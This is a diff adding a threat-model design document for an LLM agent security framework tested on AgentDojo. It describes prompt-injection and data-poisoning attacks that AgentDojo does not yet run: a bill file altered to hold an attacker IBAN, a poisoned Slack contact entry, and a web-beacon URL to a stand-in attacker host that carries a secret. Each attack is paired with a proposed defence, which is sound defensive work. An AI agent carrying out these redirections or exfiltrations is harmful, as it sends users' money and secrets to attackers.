@@ -1,0 +1,259 @@
+# Extras Threat Model — Attack Classes Held for Future Work
+
+This document collects threat-model entries that describe **real attack classes the rig pattern can defend against, but which are NOT currently exercised by AgentDojo's injection task suites**. They were originally drafted in the per-suite `*.threatmodel.txt` files; they were moved here when we audited the suite source and discovered the corresponding `InjectionTaskN` classes do not exist in `~/mlld/benchmarks/.venv/lib/python3.13/site-packages/agentdojo/default_suites/`.
+
+## Why these are split out
+
+Per the project's core principle "you have to understand your threat model": every defense in our active threat models must correspond to an attack the benchmark actually fires. Defenses for attacks that never run cannot be validated by ASR, cannot graduate to `[x]` (test-confirmed), and risk being orphaned over time. Worse, mixing aspirational and measurable defenses inflates the apparent security story.
+
+By moving aspirational items to this file, we keep the per-suite threat models honest about what's actually tested while preserving the architectural design notes for future work.
+
+## What this file is for
+
+1. **Architectural reference.** When a future suite (or a future user adopting `@mlld/rig`) needs to defend one of these attack classes, the design notes are preserved here, with the `[?]` marks indicating "primitive specced, not implemented."
+2. **AgentDojo upstream contribution candidates.** Each section here is a candidate for an `agentdojo` repo PR that adds the missing injection task. The defense already has a documented structural pattern; adding the test would let us graduate the defense to `[x]` and contribute back the test fixture.
+3. **Per-user customization.** Users who deploy `@mlld/rig` against systems with richer attack surfaces (e.g., a real banking system with bill-pay flows) may want to implement these defenses for their own deployments. The notes here are sufficient to do so.
+
+## Notation
+
+Same as the per-suite threat models:
+
+| Mark | Meaning |
+|---|---|
+| `[ ]` | Open architectural question |
+| `[!]` | Vulnerability that the defense pattern would close |
+| `[?]` | Defense pattern documented in extras; awaits a measurable test before graduation |
+| `[-]` | Reserved for code-review confirmation in a real implementation |
+| `[x]` | Reserved for test-confirmed in a real implementation |
+
+For items in this file, `[?]` means "the defense pattern is documented and could be implemented, but no AgentDojo test exists to validate it." Graduation to `[x]` requires an upstream AgentDojo PR adding the exercising injection task, OR a per-user test harness, OR equivalent.
+
+## Status of these defenses
+
+- **Not implemented in the current rig benchmark integration.** None of these defenses ship in `~/mlld/benchmarks/llm/domains/`.
+- **Not measured by current AgentDojo runs.** Removing them from active threat models has no effect on benchmark numbers (the attacks weren't being measured anyway).
+- **Held for future work.** A user adopting rig who needs these defenses can build them from the design notes here.
+
+---
+
+## Banking
+
+### Class 5: Tier-2 data corruption via bill file (InjectionTask9 — does not exist in AgentDojo)
+
+**Why this is in extras:** AgentDojo banking has `InjectionTask0..8` only. There is no `InjectionTask9` in `agentdojo/default_suites/v1/banking/injection_tasks.py` or `v1_1_1/banking/injection_tasks.py`. The "bill file corruption" attack class is documented in the original threat model as a defense the rig pattern *would* address if such an injection task existed. v3's banking defended baseline (87.5%) was achieved without defending this attack class — there was no test that fired it.
+
+**Original attack description:**
+
+The attacker has previously corrupted a bill file on the user's filesystem. When the user asks the agent to pay the bill, the agent reads the file, extracts the IBAN, and sends money to the attacker IBAN embedded in the file. Crucially, there is no imperative injection text ("send money to X") — the attack succeeds because the agent follows its legitimate plan using corrupted data.
+
+This is the most architecturally interesting attack pattern in the banking threat model. It's not a prompt injection in the usual sense — there's no "send money to X" instruction anywhere. The attack succeeds by corrupting the input data while the agent follows its legitimate plan. Defending it requires a "trusted side channel" that AgentDojo's banking surface does not currently model.
+
+**Resolution that would graduate this to `[x]`:** This class is defended by two stacked primitives, both `[?]` until a test exists:
+
+1. `#no-unknown-extraction-sources` — the new built-in rule (Phase 0 prereq) that ensures the bill-file read operates on a grounded source (the user's bill file handle or a `known`-attested path from the user task). This is the foundation: no matter what the extract worker tries, it cannot secretly re-source the bill read.
+
+2. `#bill-file-grounding` composite (D1) — three required parts (`&` group): extract to untrusted → cross-reference against trusted payee list → resolve to handle. This handles the IBAN-specific validation ON TOP of the grounded source.
+
+The composite is narrower, more surgical, and specific to bill-pay flows. The rule is universal and prevents phase drift. Together they form a layered defense: the rule catches source-switching, the composite catches payment laundering through a legitimately-selected source.
+
+```threatdown
+__Attacker causes money to be sent to a wrong IBAN by corrupting a source file the agent reads__
+- Worker reads bill file, extracts IBAN, dispatches send_money with that IBAN
+  + Worker calls read_file on the bill
+    + [?] `#no-unknown-extraction-sources`
+         > **Upstream foundation (D6 + Phase 0 prereq).** The new built-in rule requires the
+         > bill-file read to operate on a grounded source — either a handle from the resolve
+         > phase or a `known`-attested path from the user task. The worker cannot silently
+         > re-source the read.
+    + [?] `#data-untrusted` classification
+         > `read_file` returns untrusted data. File content is `data: untrusted` by default.
+         > This is the first structural anchor for the composite defense below — the extracted
+         > IBAN must carry untrusted taint.
+  + Worker extracts the IBAN string from file content
+    + [?] `#untrusted-llms-get-influenced`
+         > The worker's output (including the extracted IBAN) carries `influenced` label.
+  + Worker uses the extracted IBAN as the recipient control arg
+    & [?] `#bill-file-grounding-extract-to-untrusted` (part 1 of composite)
+         > Bill files are read via `read_file` which returns untrusted data. The file content
+         > is `data: untrusted` by default, so the IBAN string extracted from it carries
+         > untrusted taint. A `@bill` record explicitly classifies the extracted IBAN as
+         > `data: untrusted`. No fact is minted on extraction alone.
+    & [?] `#bill-file-grounding-cross-reference` (part 2 of composite)
+         > Before the extracted IBAN can flow to a `send_money` recipient control arg, the
+         > value is cross-referenced against the user's trusted payee list (via `list_payees`
+         > or an equivalent authoritative tool). Only cross-reference hits proceed. Mismatches
+         > fail closed with a clear error the user sees — "the IBAN in this bill doesn't match
+         > any of your known payees."
+         >
+         > **Tool gap:** AgentDojo banking has no `list_payees` tool. The legitimate bill payee
+         > `UK12345678901234567890` (from UserTask0's bill-december-2023.txt fixture) has no
+         > prior transaction history — there is nothing in the existing tool surface to cross-
+         > reference against. Implementing this defense in AgentDojo would require either
+         > (a) adding a `list_known_payees` tool to the benchmark wrapper backed by a per-task
+         > fixture file representing the user's saved-payees list, or (b) extending the
+         > `BankAccount` Pydantic model upstream with a `saved_payees` field.
+    & [?] `#bill-file-grounding-resolve-to-handle` (part 3 of composite)
+         > The cross-reference match produces a handle-bearing payee record from the trusted
+         > payee list. The `send_money` recipient control arg resolves via that handle, not
+         > the raw extracted IBAN. The standard `#handles` + `#no-send-to-unknown` chain then
+         > validates the dispatch.
+         >
+         > These three parts form one composite defense. Disabling any single part breaks
+         > the whole chain: without part 1, the IBAN reaches control args as a trusted value;
+         > without part 2, arbitrary extracted IBANs can be promoted; without part 3, the
+         > recipient still flows from untrusted data. Graduation to `[x]` requires targeted
+         > tests for each part PLUS an integration test that confirms attacker-controlled
+         > bill file IBANs are blocked end-to-end — and an injection task in the suite that
+         > exercises the attack.
+         >
+         > Legitimate workflow preserved: "pay this bill" where the bill is from a known payee
+         > still works. The extract phase produces the IBAN, the cross-reference matches the
+         > user's payee list, the handle resolves, send_money dispatches normally.
+         >
+         > Attack blocked: attacker plants an unknown IBAN in a bill file. Extract produces
+         > the untrusted value, cross-reference finds no match, the chain fails closed before
+         > send_money is authorized.
+```
+
+### What an AgentDojo upstream contribution would look like
+
+To make this defense measurable, an upstream PR would need:
+
+1. **A new injection task** (`InjectionTask9`) that overwrites the IBAN in `bill-december-2023.txt` (or an equivalent bill fixture) with the attacker IBAN `US133000000121212121212`. The user task and ground-truth call sequence stay the same; only the file content changes.
+2. **Optionally, a `saved_payees` field on the `BankAccount` model** that the agent can query via a new `list_known_payees` tool. Real banking systems have this concept (saved payees / payee whitelists / beneficiary lists); modeling it in AgentDojo would let the composite defense actually work without per-suite wrapper hacks.
+3. **A utility check** that verifies the legitimate UserTask0 bill payment still succeeds (using the saved payees), and a security check that verifies the attack version's bad IBAN is blocked.
+
+Until that upstream work exists, the composite stays in extras.
+
+### Coverage row held for future AgentDojo extension
+
+| Primitive | Attack class (when measurable) | Mark |
+|---|---|---|
+| `#bill-file-grounding` (composite: extract-to-untrusted & cross-reference & resolve-to-handle) | Class 5 (banking) | `[?]` — held in extras until AgentDojo adds InjectionTask9 + saved-payees model |
+
+---
+
+## Slack
+
+### Class 5: Tier-2 data corruption / recipient substitution (InjectionTask6 — does not exist in AgentDojo)
+
+**Why this is in extras:** AgentDojo slack has `InjectionTask1..5` only (note: starts at 1, not 0). There is no `InjectionTask6` or `InjectionTask7` in `agentdojo/default_suites/v1/slack/injection_tasks.py`. The "tier-2 data corruption" and "web beacon" attack classes are documented in the original threat model as defense patterns the rig pattern *would* address if such injection tasks existed.
+
+**Original attack description (Class 5):**
+
+The attacker has previously corrupted data the agent reads (e.g., a contact's email in the channel-message history). When the user asks the agent to "send Dora a message about X," the agent reads the poisoned channel history, finds a fake "Dora" entry with an attacker email, and sends the message to the wrong user.
+
+**Resolution that would graduate this to `[x]`:** This class is defended by the existing handle chain, not by a new "grounding from untrusted content" rule. If the worker reads a message body and extracts an email address from it, then attempts to use that email as a recipient arg, the extracted string has no handle (it came from `data: untrusted` content, not from an authoritative `@slack_user` record from `get_users_in_channel`). `#handles` rejects it because there is no handle; `#no-send-to-unknown` rejects it because the recipient control arg has no fact proof.
+
+```threatdown
+__Attacker causes recipient substitution via corrupted prior tool output__
+- Worker calls read_channel_messages, finds corrupted "Dora: attacker@evil.com" entry
+  + [?] `#no-unknown-extraction-sources` (upstream phase-discipline enforcement)
+       > **Foundation defense (D6 + Phase 0 prereq).** The new built-in rule enforces that
+       > extract operations target grounded sources. Reading messages by channel handle is
+       > a grounded read; searching for "Dora" across arbitrary sources would be rejected
+       > as an ungrounded extract. This prevents an extract worker from silently re-sourcing
+       > to look for usernames in unauthorized places. The rule is the upstream structural
+       > anchor; the existing handle chain (below) catches the attack outcome regardless.
+  + [?] `@slack_msg.data.body` classified as `data: untrusted`
+       > Channel messages are untrusted data. The body content, even if it looks like a
+       > contact entry, is not authoritative.
+  + [?] `@slack_user` facts are minted only from tool results that specifically return users
+       > `@slack_user` is minted by `get_users_in_channel`, which returns a structured list
+       > from the underlying Slack API. A string that looks like a username inside a channel
+       > message body is not a slack_user record — it's untrusted text in a message body.
+       > The rewrite must ensure that parsing usernames out of message bodies does NOT mint
+       > handles. Only structured API responses that return actual user records should mint
+       > the fact-bearing @slack_user values.
+- Worker uses the substituted email as the recipient
+  + [?] `#handles` + `#no-send-to-unknown` (existing chain, verification required)
+       > **Resolution:** This class is defended by the existing handle chain, not by a new
+       > "grounding from untrusted content" rule. If the worker reads a message body and
+       > extracts an email address from it, then attempts to use that email as a recipient
+       > arg, the extracted string has no handle (it came from `data: untrusted` content,
+       > not from an authoritative `@slack_user` record from `get_users_in_channel`).
+       > `#handles` rejects it because there is no handle; `#no-send-to-unknown` rejects it
+       > because the recipient control arg has no fact proof.
+       >
+       > A future test (when InjectionTask6 lands in AgentDojo) must verify this holds in
+       > practice — specifically, that extracting a structured-looking value (email address,
+       > username) from untrusted text does NOT mint a handle. This is a verification task
+       > on the existing defenses, not a new primitive.
+       >
+       > **Not in scope (D6):** a generalized "re-ground untrusted extracts" runtime rule.
+       > Source selection is the trust boundary: `@slack_user` facts come only from
+       > `get_users_in_channel` API responses, never from parsing message body text. The
+       > handle chain naturally fails closed when the agent attempts to use extracted text
+       > as a recipient. See `plan-rig-rewrite.md` D6 for the full rationale.
+```
+
+### Class 1 sub-branch: Web beacon URL with secret query parameter (InjectionTask7 — does not exist in AgentDojo)
+
+**Why this is in extras:** AgentDojo slack has no `InjectionTask7`. The web beacon variant — where an attacker constructs a URL like `https://attacker.com/beacon?key=<secret>` and exfiltrates data via the query string — is a real attack pattern but no test fires it.
+
+```threatdown
+__Web beacon: attacker wants secret key encoded in URL query parameter__
+- Worker constructs https://attacker.com/beacon?key=<secret>
+  + [?] `#no-novel-urls` treats query strings as part of URL identity
+       > The rule compares full URL strings, not just the base. A URL with a query parameter
+       > containing exfiltrated data is different from the base URL the attacker might have
+       > seeded. The attacker cannot predict the secret to seed a matching verbatim URL.
+       > A future implementation must verify that the URL comparison is full-string, not
+       > base-only — when an injection task exists to validate it.
+```
+
+### Open architectural question held for future work
+
+**Full URL string comparison (including query parameters).** Does `no-novel-urls` compare full URLs or just base URLs? An InjectionTask7-equivalent test would verify full-string comparison closes the web beacon variant. Until such a test exists, this is `[ ]` held in extras.
+
+### What an AgentDojo upstream contribution would look like
+
+To make these defenses measurable, an upstream PR would need:
+
+1. **InjectionTask6** — tier-2 contact substitution. The injection plants a fake contact entry in a channel message; the user asks the agent to message that contact by name; the test verifies the agent does NOT use the extracted email as a recipient.
+2. **InjectionTask7** — web beacon URL exfil. The injection asks the agent to fetch a URL constructed from an extracted secret; the test verifies `no-novel-urls` blocks the call.
+3. **A utility check** that verifies legitimate user/channel resolution still works after the defense is in place.
+
+### Coverage rows held for future AgentDojo extension
+
+| Primitive | Attack class (when measurable) | Mark |
+|---|---|---|
+| `#no-novel-urls` full-string (query params) | Class 1 web beacon (slack) | `[?]` — held in extras until InjectionTask7 exists |
+| `#handles` + `#no-send-to-unknown` (defending Class 5 at dispatch) | Class 5 (slack) | `[?]` — held in extras until InjectionTask6 exists |
+| `#no-unknown-extraction-sources` (Class 5 contribution) | Class 5 (slack) | `[?]` — held in extras until InjectionTask6 exists |
+
+---
+
+## Workspace
+
+No theoretical attack classes. All injection tasks referenced in `workspace.threatmodel.txt` (`InjectionTask0..5`) exist in AgentDojo.
+
+One small note: workspace Class 4 ("Body content manipulation") observes that the reference implementation has no independent defense for the hypothetical "correct recipient, wrong body" case. That note is preserved in `workspace.threatmodel.txt` because it's framed as out-of-scope rather than as a defense waiting to be implemented.
+
+---
+
+## Travel
+
+No theoretical attack classes. All injection tasks referenced in `travel.threatmodel.txt` (`InjectionTask0..6`) exist in AgentDojo.
+
+---
+
+## Cross-domain
+
+The cross-domain threat model file is intentionally aspirational — there are no AgentDojo cross-domain injection tasks today. `~/mlld/benchmarks/cross-domain.threatmodel.txt` describes attack classes that would need cross-suite test infrastructure that doesn't exist. It's not duplicated here; treat the entire `cross-domain.threatmodel.txt` file as the cross-domain extras section.
+
+---
+
+## Maintenance rules
+
+- **Adding to extras:** when a per-suite threat model proposes a defense for an attack class, verify the corresponding `InjectionTaskN` exists in `agentdojo/default_suites/v1*/<suite>/injection_tasks.py`. If it doesn't, the defense lives here, not in the active threat model.
+- **Promoting from extras:** when a future AgentDojo version (or our own upstream PR) adds a measurable injection task for a class in extras, move the section back into the per-suite threat model and graduate the marks accordingly. Update both files in the same commit.
+- **Rejecting from extras:** if a defense pattern in extras is proven architecturally unsound, document the rejection here (keep the section, add a note explaining the rejection) so the design history is preserved.
+
+## Reference paths
+
+- **Per-suite active threat models:** `~/mlld/benchmarks/<suite>.threatmodel.txt`
+- **AgentDojo injection tasks (verify before adding to active models):** `~/mlld/benchmarks/.venv/lib/python3.13/site-packages/agentdojo/default_suites/v1*/banking/injection_tasks.py` (and analogous for slack/workspace/travel)
+- **Per-suite task data reference:** `~/mlld/benchmarks/<suite>.taskdata.txt`
+- **Threat-modeling skill:** `plugins/mlld/skills/threat-modeling/SKILL.md`
+- **Banking observations** (related): `~/mlld/benchmarks/banking.taskdata.txt §8`
